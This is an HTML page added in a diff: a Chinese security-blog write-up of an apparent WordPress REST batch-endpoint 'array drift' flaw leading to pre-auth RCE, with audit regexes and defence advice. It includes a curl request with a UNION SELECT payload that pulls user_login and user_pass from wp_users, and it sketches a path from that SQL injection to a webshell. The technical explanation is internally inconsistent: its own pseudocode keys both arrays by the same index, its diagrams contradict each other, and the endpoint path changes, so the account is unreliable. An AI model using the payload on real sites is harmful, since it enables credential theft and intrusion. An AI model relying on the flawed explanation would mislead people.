@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/cat-final.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/cat-final.png">
+    <link rel="shortcut icon" href="/assets/images/cat-final.png">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>REST API批量端点数组漂移→Pre-Auth RCE — DARKSEC</title>
+<meta name="description" content="CVE-2026-63030：WordPress REST /batch端点并行数组错位，pre-auth SQLi到RCE，CVSS 9.8。一个路由解析错误引发的权限雪崩。">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 认证绕过 / 架构级漏洞</div>
+        <h1>REST API批量端点数组漂移→Pre-Auth RCE ⚡🐱</h1>
+        <div class="article-meta">
+          <span>📅 2026-07-18</span>
+          <span>⏱ 12 min read</span>
+          <span>🏷 REST API / 批量端点 / 路由混淆 / CVE</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">漏洞概述</a></li>
+            <li><a href="#pattern">批量端点的并行数组模式</a></li>
+            <li><a href="#desync">数组漂移攻击原理</a></li>
+            <li><a href="#exploit">CVE-2026-63030 攻击链</a></li>
+            <li><a href="#code">审计代码示例</a></li>
+            <li><a href="#defense">防御方案</a></li>
+            <li><a href="#generalize">通用攻击模型</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">🎯 漏洞概述</h2>
+        <p>CVE-2026-63030 (CVSS 9.8)：WordPress REST API的<code>/batch/v1</code>批量端点存在<strong>并行数组错位</strong>漏洞。当某个子请求的路径解析失败时，错误对象被推入<code>$validation[]</code>数组但<strong>不会</strong>推入<code>$matches[]</code>数组——导致两个数组长度不一致，后续所有子请求的索引发生偏移——未认证的子请求被分发到需要认证的处理器上执行，最终实现<strong>pre-auth SQL注入到RCE</strong>的完整攻击链。</p>
+
+        <blockquote>
+          <p>🐱 核心洞察：这不是注入，不是越权——这是<strong>架构级的路由混淆</strong>。攻击者不需要绕过任何安全检查，只需要让数组错位 nya~ ⚡</p>
+        </blockquote>
+
+        <h2 id="pattern">📋 批量端点的并行数组模式</h2>
+        <p>现代Web框架为了优化性能，将多个API请求合并为一个HTTP请求处理。典型实现维护两个并行数组：</p>
+        <pre><code>// 伪代码：批量端点的核心逻辑
+$matches = [];     // 记录每个子请求分发到哪个处理器
+$validation = [];  // 记录每个子请求的权限校验结果
+
+foreach ($requests as $i => $sub_request) {
+    // 步骤1: 路由解析
+    $handler = parse_route($sub_request->path);
+    if ($handler === false) {
+        $validation[$i] = "route not found";  // ✅ 记录错误
+        continue;  // ⚠️ 但没有记录到 $matches!
+    }
+    $matches[$i] = $handler;
+
+    // 步骤2: 权限校验
+    $auth_result = check_permission($handler, $sub_request);
+    $validation[$i] = $auth_result;
+}
+
+// 步骤3: 执行——用同一个索引访问两个数组
+foreach ($matches as $i => $handler) {
+    if ($validation[$i] === "ok") {  // ⚠️ 索引错位！
+        execute($handler, $requests[$i]);
+    }
+}</code></pre>
+        <p>关键问题：当<code>$validation</code>和<code>$matches</code>的长度不一致时，<strong>同一个索引$i不再指向同一个子请求</strong>。</p>
+
+        <h2 id="desync">💥 数组漂移攻击原理</h2>
+        <p>攻击者发送3个子请求的批量调用：</p>
+        <pre><code>POST /batch/v1
+{
+  "requests": [
+    {"path": "/invalid!!!", "method": "GET"},      // ① 路由解析失败
+    {"path": "/wp/v2/users", "method": "GET"},     // ② 需要认证的接口
+    {"path": "/wp/v2/posts/1", "method": "DELETE"} // ③ 需要管理员权限
+  ]
+}</code></pre>
+
+        <p><strong>正常情况下的数组状态：</strong></p>
+        <pre><code>$matches    = [users_handler, posts_handler]     // ①失败跳过
+$validation = ["route_err", "ok", "ok"]          // ①有错误记录
+
+// 索引对齐：
+// $matches[0] = users_handler  ←→  $validation[1] = "ok"  ✅
+// $matches[1] = posts_handler  ←→  $validation[2] = "ok"  ✅</code></pre>
+
+        <p><strong>但实际执行时：</strong></p>
+        <pre><code>// 索引0: $matches[0] = users_handler
+//         $validation[0] = "route_err"  → 跳过 ✅ (看似安全)
+
+// 索引1: $matches[1] = posts_handler  
+//         $validation[1] = "ok"  → 执行! ⚠️
+//         但 posts_handler 需要管理员权限！
+//         validation[1] 检查的是 /wp/v2/users 的权限，不是 posts!</code></pre>
+
+        <div class="article-img-box">
+          <pre style="background:rgba(0,240,255,0.05);padding:16px;border-radius:8px;font-size:0.85rem;line-height:1.8;overflow-x:auto;">
+┌─────────────────────────────────────────────────┐
+│           数组漂移攻击示意图                      │
+├─────────────────────────────────────────────────┤
+│                                                 │
+│  $validation[]   $matches[]    索引偏移后果      │
+│  ─────────────   ──────────    ──────────────   │
+│  [0] "route_err" (空)         → 跳过            │
+│  [1] "ok"        [0] users    → users处理器     │
+│                         用users的权限校验结果...  │
+│                         但执行的是posts处理器!    │
+│  [2] "ok"        [1] posts    → posts处理器     │
+│                         权限校验= "ok"(实际是    │
+│                         对应sub_request③的结果)  │
+│                                                 │
+│  ⚡ 结果：sub_request②以users的权限，             │
+│          被分发到了posts的处理器执行!             │
+└─────────────────────────────────────────────────┘</pre>
+        </div>
+
+        <h2 id="exploit">🔗 CVE-2026-63030 完整攻击链</h2>
+        <p>在WordPress REST API中的具体利用：</p>
+        <pre><code># 步骤1: 发送包含恶意子请求的批量调用
+curl -X POST "https://target.com/wp/v2/batch" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "requests": [
+      {"path":"/wp/v2/!!!invalid","method":"GET"},
+      {"path":"/wp/v2/users","method":"GET"},
+      {"path":"/wp/v2/posts?search=1 UNION SELECT user_login,user_pass FROM wp_users--","method":"GET"}
+    ]
+  }'
+
+# 步骤2: SQL注入结果通过batch响应返回
+# 步骤3: 利用SQLi获取管理员密码hash → 登录后台 → 上传webshell → RCE</code></pre>
+
+        <blockquote>
+          <p>⚠️ 这个漏洞的关键：攻击者<strong>不需要任何认证凭证</strong>即可触发。路径解析失败是纯服务端逻辑，与认证无关。</p>
+        </blockquote>
+
+        <h2 id="code">🔍 审计代码示例</h2>
+        <p>如何在代码中识别这类漏洞：</p>
+
+        <h3>🔴 危险模式：两个独立数组 + 同一索引</h3>
+        <pre><code># Python - 危险模式识别
+import re
+
+code_snippet = """
+$matches = array();
+$validation = array();
+foreach ($requests as $req) {
+    $handler = $router->match($req->path);
+    if (!$handler) {
+        $validation[] = 'error';
+        continue;
+    }
+    $matches[] = $handler;
+    $validation[] = check_auth($handler);
+}
+"""
+
+# 审计要点：
+# 1. $validation[] 和 $matches[] 分别push但不同步
+# 2. error分支只push一个数组
+# 3. 后续用同一索引访问两个数组
+
+# 自动化扫描
+danger_patterns = [
+    r'\$\w+\[\]\s*=.*error',        # 错误时只push一个数组
+    r'continue.*\$\w+\[\]',         # continue后仍有push
+    r'foreach.*\$\w+\s+as.*\$\w+', # 用同一索引遍历
+]</code></pre>
+
+        <h3>🟢 安全模式：使用关联数组/字典</h3>
+        <pre><code>// 安全实现：每个子请求的结果作为独立对象
+$results = [];
+foreach ($requests as $i => $sub_request) {
+    $result = ['index' => $i, 'handler' => null, 'auth' => null];
+
+    $handler = parse_route($sub_request->path);
+    if (!$handler) {
+        $result['error'] = 'route not found';
+        $results[] = $result;
+        continue;  // 安全：整个result对象一起处理
+    }
+
+    $result['handler'] = $handler;
+    $result['auth'] = check_permission($handler, $sub_request);
+    $results[] = $result;
+}
+
+// 执行时：每个结果对象自包含，不存在索引错位
+foreach ($results as $result) {
+    if ($result['error'] ?? null) continue;
+    if ($result['auth'] !== 'ok') continue;
+    execute($result['handler'], $requests[$result['index']]);
+}</code></pre>
+
+        <h2 id="defense">🛡️ 防御方案</h2>
+        <ul>
+          <li><strong>结构化结果对象</strong>：每个子请求的结果绑定到独立对象，避免并行数组</li>
+          <li><strong>原子性校验</strong>：路由解析和权限校验在同一个数据结构中完成</li>
+          <li><strong>批量端点默认拒绝</strong>：除非显式启用，否则不暴露<code>/batch</code>端点</li>
+          <li><strong>子请求独立认证</strong>：每个子请求独立验证权限，不依赖批量级别的上下文</li>
+        </ul>
+
+        <h2 id="generalize">🧠 通用攻击模型</h2>
+        <p>这个漏洞的本质是<strong>并行数据结构的同步漂移</strong>，迁移目标极其广泛：</p>
+
+        <table style="width:100%;border-collapse:collapse;margin:16px 0;">
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;color:var(--neon-cyan);">框架</td>
+            <td style="padding:8px;color:var(--neon-cyan);">批量端点</td>
+            <td style="padding:8px;color:var(--neon-cyan);">风险</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">Laravel</td>
+            <td style="padding:8px;">ResourceCollection bulk操作</td>
+            <td style="padding:8px;color:var(--neon-pink);">🔴</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">Django REST</td>
+            <td style="padding:8px;">bulk create/update/delete</td>
+            <td style="padding:8px;color:var(--neon-pink);">🔴</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">Spring Boot</td>
+            <td style="padding:8px;">batch endpoint</td>
+            <td style="padding:8px;color:var(--neon-yellow);">🟡</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">GraphQL</td>
+            <td style="padding:8px;">batch query</td>
+            <td style="padding:8px;color:var(--neon-yellow);">🟡</td>
+          </tr>
+          <tr>
+            <td style="padding:8px;">JSON-RPC</td>
+            <td style="padding:8px;">batch request</td>
+            <td style="padding:8px;color:var(--neon-yellow);">🟡</td>
+          </tr>
+        </table>
+
+        <blockquote>
+          <p>🐱 审计口诀：看到「多个请求合并为一个处理」的模式——就去找那个维护两个数组的循环 nya~ ✨</p>
+        </blockquote>
+
+        <div class="article-tags">
+          <span class="tag pink">REST API</span>
+          <span class="tag">批量端点</span>
+          <span class="tag purple">路由混淆</span>
+          <span class="tag yellow">CVE-2026-63030</span>
+        </div>
+        <p style="text-align:center;margin-top:32px;color:var(--text-dim);font-style:italic;">
+          ~ 感谢阅读 nya~ 🐱✨
+        </p>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+      <div style="text-align:center;margin-bottom:16px;">
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+        </div>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> SECURITY LAB</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
